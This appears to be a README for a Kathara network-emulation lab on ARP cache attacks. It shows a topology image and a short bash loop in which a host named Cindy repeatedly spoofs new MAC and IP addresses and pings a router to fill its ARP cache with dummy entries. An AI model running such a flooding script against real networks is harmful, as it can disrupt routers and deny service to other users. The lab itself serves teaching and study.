# ARP POISONING

NETWORK TOPOLOGY

<div align="center">
  <img src="https://github.com/mariocuomo/kathara-testing/blob/main/labs/arp_poisoning/schema.png" width="800">
</div>


Cindy sends continuous pings to the router with **different** ip and mac addresses.<br>
The router is forced each time to insert a **new dummy** entry in its arp cache.

Cindy's malicious script is located in _/var/script/script.sh_

```Bash
while true
do
   macaddres=$(macaddressgenerator)

   ip_address=$(ipgenerator)
   echo $ip_address

   #CHANGE MACADDRESS
   ifconfig eth0 down hw ether $macaddres
   ifconfig eth0 up

   #CHANGE IP
   ifconfig eth0 down
   ifconfig eth0 inet $ip_address

   ping 175.11.14.2 -c 1
done
```






